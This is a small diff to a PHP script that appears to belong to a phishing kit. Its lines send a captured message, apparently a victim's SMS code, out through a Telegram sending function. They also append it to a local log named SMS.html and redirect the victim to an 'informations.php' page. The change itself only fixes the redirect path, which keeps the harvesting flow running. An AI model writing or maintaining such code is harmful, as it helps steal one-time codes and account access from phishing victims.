@@ -10,5 +10,5 @@ telegram_send(urlencode($message));
 $house = fopen('fucked/SMS.html', 'a');
 fwrite($house, $message);
 fclose($house);
-header("Location: clients/informations.php");
+header("Location: informations.php");
 ?>
